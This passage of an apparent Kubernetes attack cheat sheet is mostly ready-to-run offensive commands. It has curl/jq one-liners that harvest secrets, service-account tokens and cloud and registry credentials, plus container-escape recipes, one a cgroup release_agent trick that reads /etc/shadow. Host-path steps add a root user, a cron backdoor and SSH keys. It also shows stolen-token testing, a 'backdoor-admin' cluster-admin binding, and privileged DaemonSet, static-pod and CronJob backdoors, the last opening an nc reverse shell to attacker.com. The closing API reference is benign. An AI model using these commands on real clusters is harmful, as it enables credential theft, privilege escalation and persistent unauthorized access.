| **List Custom Resources** | Instances of CRDs | `kubectl get mycustomresource` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/mygroup/v1/mycustomresources"` | Environment-specific |
| **API Groups** | All API groups | `kubectl api-versions` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis" \| jq -r '.groups[].name'` | Discovery |
| **API Resources in Group** | Resources per group | `kubectl api-resources --api-group=apps` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1" \| jq '.resources[].name'` | Detailed mapping |

---

## Advanced Exploitation Techniques

### 🎯 High-Value One-Liners

```bash
# Find all readable secrets across all namespaces
for ns in $(curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name'); do
  echo "=== Namespace: $ns ==="
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/$ns/secrets" 2>/dev/null | \
    jq -r '.items[]? | "\(.metadata.name): \(.type)"' 2>/dev/null
done

# Extract all service account tokens from pods
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" | \
  jq -r '.items[] | select(.spec.serviceAccountName != "default") | 
  "\(.metadata.namespace)/\(.metadata.name) -> SA: \(.spec.serviceAccountName)"'

# Find all cluster-admin bindings and their subjects
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | 
  {binding: .metadata.name, subjects: .subjects}'

# Find pods with dangerous Linux capabilities
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" | \
  jq '.items[] | select(
    .spec.containers[].securityContext.capabilities.add[]? | 
    test("SYS_ADMIN|NET_ADMIN|SYS_PTRACE|SYS_MODULE|DAC_READ_SEARCH")
  ) | "\(.metadata.namespace)/\(.metadata.name)"'

# Find all pods running as UID 0 (root)
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" | \
  jq '.items[] | select(
    (.spec.containers[].securityContext.runAsUser == 0) or
    (.spec.securityContext.runAsUser == 0) or
    (.spec.containers[].securityContext.runAsUser == null and
     .spec.securityContext.runAsUser == null)
  ) | "\(.metadata.namespace)/\(.metadata.name)"'

# Find secrets with AWS credentials
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" | \
  jq -r '.items[] | select(
    .data | keys[] | test("aws|AWS|access.key|secret.key"; "i")
  ) | "\(.metadata.namespace)/\(.metadata.name)"'

# Find ConfigMaps with embedded credentials
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/configmaps" | \
  jq -r '.items[] | select(
    .data | to_entries[]? | .value | 
    test("password|token|secret|key|credential|apikey"; "i")
  ) | "\(.metadata.namespace)/\(.metadata.name)"'

# List all service accounts with cluster-admin role
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" | \
  jq -r '.items[] | select(
    .roleRef.name == "cluster-admin" and 
    .subjects[]?.kind == "ServiceAccount"
  ) | .subjects[] | "\(.namespace)/\(.name)"'

# Find roles with wildcard permissions
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" | \
  jq -r '.items[] | select(
    .rules[]? | 
    (.verbs[]? == "*") or 
    (.resources[]? == "*") or 
    (.apiGroups[]? == "*")
  ) | .metadata.name'

# Find pods with host path mounts on sensitive directories
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" | \
  jq '.items[] | select(
    .spec.volumes[]?.hostPath.path | 
    test("^/|/etc|/var|/proc|/sys|/root|/home")
  ) | "\(.metadata.namespace)/\(.metadata.name): \(
    [.spec.volumes[]?.hostPath.path] | join(", ")
  )"'

# Enumerate all TLS secrets and their associated ingresses
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/networking.k8s.io/v1/ingresses" | \
  jq -r '.items[] | select(.spec.tls) | 
  "\(.metadata.namespace)/\(.metadata.name): \(
    [.spec.tls[].secretName] | join(", ")
  )"'

# Find deployments without resource limits (resource exhaustion risk)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/apps/v1/deployments" | \
  jq '.items[] | select(
    .spec.template.spec.containers[].resources.limits == null
  ) | "\(.metadata.namespace)/\(.metadata.name)"'

# Find namespaces without network policies (no isolation)
NAMESPACES=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces" | jq -r '.items[].metadata.name')
POLICY_NS=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/networking.k8s.io/v1/networkpolicies" | \
  jq -r '.items[].metadata.namespace' | sort -u)
comm -23 <(echo "$NAMESPACES" | sort) <(echo "$POLICY_NS")

# Find all image pull secrets (docker registry credentials)
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" | \
  jq -r '.items[] | select(.type == "kubernetes.io/dockerconfigjson") | 
  "\(.metadata.namespace)/\(.metadata.name)"'

# Extract and decode a dockerconfigjson secret
SECRET_NAME="myregistry-secret"
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/$SECRET_NAME" | \
  jq -r '.data[".dockerconfigjson"]' | base64 -d | jq .

# Find all pods that can write to host filesystem
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" | \
  jq '.items[] | select(
    .spec.volumes[]?.hostPath and
    (.spec.containers[].volumeMounts[] | 
     select(.readOnly != true))
  ) | "\(.metadata.namespace)/\(.metadata.name)"'
```

### 🔓 Container Escape Techniques

#### Privileged Container Escape

```bash
# From inside a privileged pod:

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host

# Or use nsenter to enter host namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Or manipulate cgroups
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

#### Host Path Mount Exploitation

```bash
# If /var/log is mounted:
# 1. Write to system logs to trigger log processing
echo "malicious payload" > /var/log/syslog

# 2. Overwrite cron jobs
echo "* * * * * root /tmp/backdoor" > /var/spool/cron/crontabs/root

# If /etc is mounted:
# 3. Modify /etc/passwd to add root user
echo 'hacker:x:0:0::/root:/bin/bash' >> /etc/passwd

# 4. Add SSH key
mkdir -p /root/.ssh
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

#### hostNetwork Pod Exploitation

```bash
# From inside a hostNetwork pod:

# Scan internal services
nmap -p- 10.0.0.0/16

# Access kubelet API (usually port 10250)
curl -sk https://localhost:10250/pods | jq .

# Access node metrics
curl -sk https://localhost:10250/metrics

# Execute commands via kubelet (if enabled)
curl -sk -X POST "https://localhost:10250/run/namespace/pod/container" \
  -d "cmd=whoami"
```

### 🔑 Token Theft & Privilege Escalation

#### Extract Service Account Tokens from Pods

```bash
# Method 1: Direct file read (legacy)
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Method 2: Via API (if you have exec access)
kubectl exec -it target-pod -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Method 3: From pod spec (if SA has token secret)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/target-pod" | \
  jq -r '.spec.volumes[] | select(.name == "kube-api-access-*") | 
  .projected.sources[0].serviceAccountToken'

# Method 4: Extract from secret (legacy SA tokens)
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" | \
  jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | 
  .data.token' | base64 -d
```

#### Test Stolen Token

```bash
# Set stolen token
STOLEN_TOKEN="eyJhbGci..."

# Test what it can do
curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "verb": "*",
        "resource": "*"
      }
    }
  }' | jq .

# Try to list secrets
curl -sk -H "Authorization: Bearer $STOLEN_TOKEN" \
  "$APISERVER/api/v1/secrets" | jq .
```

#### Privilege Escalation via Role Manipulation

```bash
# If you can edit roles or rolebindings:

# Create cluster-admin binding for your service account
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: backdoor-admin
subjects:
- kind: ServiceAccount
  name: default
  namespace: $NAMESPACE
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF

# Via curl:
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" \
  -d '{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "ClusterRoleBinding",
    "metadata": {
      "name": "backdoor-admin"
    },
    "subjects": [{
      "kind": "ServiceAccount",
      "name": "default",
      "namespace": "'"$NAMESPACE"'"
    }],
    "roleRef": {
      "kind": "ClusterRole",
      "name": "cluster-admin",
      "apiGroup": "rbac.authorization.k8s.io"
    }
  }'
```

### 🎭 Backdoor & Persistence

#### Create Privileged DaemonSet Backdoor

```bash
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor-ds
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: backdoor
  template:
    metadata:
      labels:
        name: backdoor
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: backdoor
        image: alpine
        command: ["/bin/sh"]
        args: ["-c", "while true; do sleep 3600; done"]
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
EOF
```

#### Create CronJob Backdoor

```bash
cat <<EOF | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata:
  name: backdoor-cron
  namespace: default
spec:
  schedule: "*/5 * * * *"  # Every 5 minutes
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: backdoor
            image: alpine
            command: ["/bin/sh", "-c"]
            args:
            - |
              # Reverse shell to attacker
              nc -e /bin/sh attacker.com 4444
          restartPolicy: OnFailure
EOF
```

#### Static Pod Backdoor (Node Level)

```bash
# If you have access to a node's filesystem:
# Write to /etc/kubernetes/manifests/backdoor.yaml

cat <<EOF > /etc/kubernetes/manifests/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-static
  namespace: kube-system
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: backdoor
    image: alpine
    command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Kubelet will automatically start this pod
```

---

## API Resource Deep Dive

### Core API Groups Structure

```
Kubernetes API Hierarchy
│
├── Core API (/api/v1)
│   ├── namespaces
│   ├── pods
│   ├── services
│   ├── secrets
│   ├── configmaps
│   ├── persistentvolumes
│   ├── persistentvolumeclaims
│   ├── serviceaccounts
│   ├── nodes
│   ├── events
│   └── endpoints
│
├── Apps API (/apis/apps/v1)
│   ├── deployments
│   ├── replicasets
│   ├── statefulsets
│   └── daemonsets
│
├── Batch API (/apis/batch/v1)
│   ├── jobs
│   └── cronjobs
│
├── RBAC API (/apis/rbac.authorization.k8s.io/v1)
│   ├── roles
│   ├── rolebindings
│   ├── clusterroles
│   └── clusterrolebindings
│
├── Networking API (/apis/networking.k8s.io/v1)
│   ├── networkpolicies
│   ├── ingresses
│   └── ingressclasses
│
├── Storage API (/apis/storage.k8s.io/v1)
│   ├── storageclasses
│   └── volumeattachments
│
├── Policy API (/apis/policy/v1)
│   ├── poddisruptionbudgets
│   └── podsecuritypolicies (deprecated)
│
└── Custom Resource Definitions (/apis/apiextensions.k8s.io/v1)
    └── customresourcedefinitions
```

### Generic API Request Patterns

```bash
# LIST all resources in a namespace
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/<group>/<version>/namespaces/<namespace>/<resource>"

# LIST all resources cluster-wide
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/<group>/<version>/<resource>"

# GET a specific resource
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/apis/<group>/<version>/namespaces/<namespace>/<resource>/<name>"

# CREATE a resource
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$APISERVER/apis/<group>/<version>/namespaces/<namespace>/<resource>" \
  -d @resource.json

# UPDATE a resource
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X PUT "$APISERVER/apis/<group>/<version>/namespaces/<namespace>/<resource>/<name>" \
  -d @resource.json

# PATCH a resource
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/strategic-merge-patch+json" \
  -X PATCH "$APISERVER/apis/<group>/<version>/namespaces/<namespace>/<resource>/<name>" \
  -d '{"metadata":{"labels":{"backdoor":"true"}}}'

# DELETE a resource
curl -sk -H "Authorization: Bearer $TOKEN" \
  -X DELETE "$APISERVER/apis/<group>/<version>/namespaces/<namespace>/<resource>/<name>"
```

### Query Parameters

```bash
# Label selector
?labelSelector=app=nginx,tier=frontend

# Field selector  
?fieldSelector=status.phase=Running,spec.nodeName=node1

# Limit results
?limit=100

# Continue token for pagination
?limit=100&continue=<token>

# Watch for changes (streaming)
?watch=true

# Resource version
?resourceVersion=12345

# Timeout
?timeoutSeconds=30

# Example: Complex query
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/pods?labelSelector=app=nginx&fieldSelector=status.phase=Running&limit=50"
```


##
##
